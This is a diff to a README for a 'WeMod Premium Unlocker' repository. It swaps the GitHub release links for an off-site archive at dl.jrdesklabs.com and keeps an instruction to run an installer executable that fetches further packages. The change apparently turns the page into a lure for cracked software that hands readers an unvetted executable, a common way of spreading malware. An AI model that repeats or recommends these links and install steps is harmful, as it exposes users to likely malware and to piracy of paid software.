@@ -9,11 +9,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/39af3e08-b035-4eb9-8f87-f2adc7829c64)
-](https://github.com/Gabriel-Dias-Oliveira/Wemod-Premium-Unlocker-2024/releases/download/V5.5/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/Gabriel-Dias-Oliveira/Wemod-Premium-Unlocker-2024/releases/download/V5.5/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-16_23-48-18](https://github.com/user-attachments/assets/e53facb9-e18f-49d8-9433-8751aa3a18bc)
